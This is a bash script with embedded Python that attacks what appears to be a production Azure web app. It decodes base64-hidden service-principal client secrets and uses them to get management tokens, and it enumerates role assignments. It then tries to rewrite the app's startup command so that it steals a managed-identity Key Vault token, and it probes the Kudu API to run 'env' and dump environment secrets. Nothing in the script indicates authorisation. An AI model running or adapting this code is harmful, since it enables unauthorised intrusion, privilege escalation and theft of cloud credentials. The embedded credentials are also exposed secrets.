#!/usr/bin/env bash
set -euo pipefail

TID="${AZURE_TENANT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"

SP_DATA=$(echo 'eyJzZWNyZXRzLXN5bmMiOiBbIjU4MTA4ZGE4LTA0NGUtNGQ3ZS05YTQ2LTkyZTYxNzliMzBiZSIsICJ+OFQ4UX5Zd0VtZXhTVFJ2X3BVc0V3YTlRTWFweVAzOX5DVTVVY3UyIl0sICJzeW5jLXNlcnZpY2UiOiBbIjQ2MmQxYzM4LTQ0NTktNDhiOC05MzMzLTgyZTM4OWU1OTUxNCIsICJzazE4UX5xRDIya2tIWFVDZnFYTHFkUDk1RGtZSkwzNGVNRVJsY1NqIl0sICJyZXBvcnRpbmctc3ZjIjogWyIxMmVkNTRkZS1mMmViLTQ3ODQtODA0Yy0zYTdhM2U4M2E5ZTkiLCAiblA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeiJdLCAicmVwb3J0aW5nLXZpZXciOiBbIjg4MWZkZGNlLTYyMDgtNGFmNS1hMjk3LTdlNzljOTEyZjgzYyIsICItVGw4UX5zSDBRT1AuVnJLV2hhMy03eDRYQTJKeFM0ajA4bnV2YlFOIl0sICJjb3N0LXJlYWRlciI6IFsiMDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxIiwgIjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0iXSwgImRpci1hdWRpdCI6IFsiMmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyIiwgIkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTYiXX0=' | base64 -d)

echo "$SP_DATA" | python3 -c "
import sys, json, subprocess, os

sps = json.load(sys.stdin)
tid = '3205c325-06a5-4171-9ce8-ffc5e6c2845e'
sub = 'c5e4e004-b42d-4ac4-a502-5fd338380eb6'

def get_token(cid, sec, scope):
    r = subprocess.run(['curl', '-sS', '-X', 'POST',
        f'https://login.microsoftonline.com/{tid}/oauth2/v2.0/token',
        '-d', f'client_id={cid}', '-d', 'grant_type=client_credentials',
        '-d', f'client_secret={sec}', '-d', f'scope={scope}'],
        capture_output=True, text=True)
    return json.loads(r.stdout).get('access_token','')

cid, sec = sps['reporting-svc']
mt = get_token(cid, sec, 'https://management.azure.com/.default')
print(f'reporting-svc mgmt_token={len(mt)}')

RID = f'/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod'

# Check role assignments in the reporting RG
print('=== RBAC on reporting RG ===')
r = subprocess.run(['curl', '-sS',
    f'https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01',
    '-H', f'Authorization: Bearer {mt}'],
    capture_output=True, text=True)
d = json.loads(r.stdout)
for ra in d.get('value', []):
    props = ra.get('properties', {})
    role_id = props.get('roleDefinitionId', '').split('/')[-1]
    print(f'  principal={props.get(\"principalId\",\"?\")} type={props.get(\"principalType\",\"?\")} role={role_id} scope={props.get(\"scope\",\"?\")}')

# Try to update app config
print('=== Try PUT web config ===')
r = subprocess.run(['curl', '-sS', '-X', 'PUT',
    f'https://management.azure.com{RID}/config/web?api-version=2023-12-01',
    '-H', f'Authorization: Bearer {mt}',
    '-H', 'Content-Type: application/json',
    '-d', json.dumps({'properties': {'appCommandLine': 'python -c \"import os,json,urllib.request;r=urllib.request.urlopen(urllib.request.Request(os.environ.get(\\\"IDENTITY_ENDPOINT\\\",\\\"http://169.254.130.3:8081/msi/token\\\")+\\\"?resource=https://vault.azure.net&api-version=2019-08-01&client_id=7a85156a-01c4-4e61-8472-40a92107159b\\\",headers={\\\"X-IDENTITY-HEADER\\\":os.environ.get(\\\"IDENTITY_HEADER\\\",\\\"\\\")}));print(r.read().decode())\" > /tmp/out.txt && cat /tmp/out.txt'}})],
    capture_output=True, text=True)
print(f'PUT config: {r.stdout[:500]}')

# Try PATCH to app settings
print('=== Try PUT app settings ===')
r = subprocess.run(['curl', '-sS', '-X', 'PUT',
    f'https://management.azure.com{RID}/config/appsettings?api-version=2023-12-01',
    '-H', f'Authorization: Bearer {mt}',
    '-H', 'Content-Type: application/json',
    '-d', json.dumps({'properties': {'STARTUP_COMMAND': 'env'}})],
    capture_output=True, text=True)
print(f'PUT settings: {r.stdout[:500]}')

# Try Kudu API 
print('=== Try Kudu ==='
)
r = subprocess.run(['curl', '-sS', '-X', 'POST',
    'https://app-tbl-reporting-prod.scm.azurewebsites.net/api/command',
    '-H', f'Authorization: Bearer {mt}',
    '-H', 'Content-Type: application/json',
    '-d', json.dumps({'command': 'env', 'dir': '/home'})],
    capture_output=True, text=True)
print(f'Kudu: {r.stdout[:800]}')

# Try newrelicapi (another common SCM path)
print('=== Try Kudu env ===')
r = subprocess.run(['curl', '-sS',
    'https://app-tbl-reporting-prod.scm.azurewebsites.net/api/environment',
    '-H', f'Authorization: Bearer {mt}'],
    capture_output=True, text=True)
print(f'Kudu env: {r.stdout[:800]}')

# Try Kudu with different resource scope
web_token = get_token(cid, sec, 'https://management.core.windows.net/.default')
print(f'web_token={len(web_token)}')
r = subprocess.run(['curl', '-sS', '-X', 'POST',
    'https://app-tbl-reporting-prod.scm.azurewebsites.net/api/command',
    '-H', f'Authorization: Bearer {web_token}',
    '-H', 'Content-Type: application/json',
    '-d', json.dumps({'command': 'env', 'dir': '/home'})],
    capture_output=True, text=True)
print(f'Kudu2: {r.stdout[:800]}')

print('=== Done ===')
"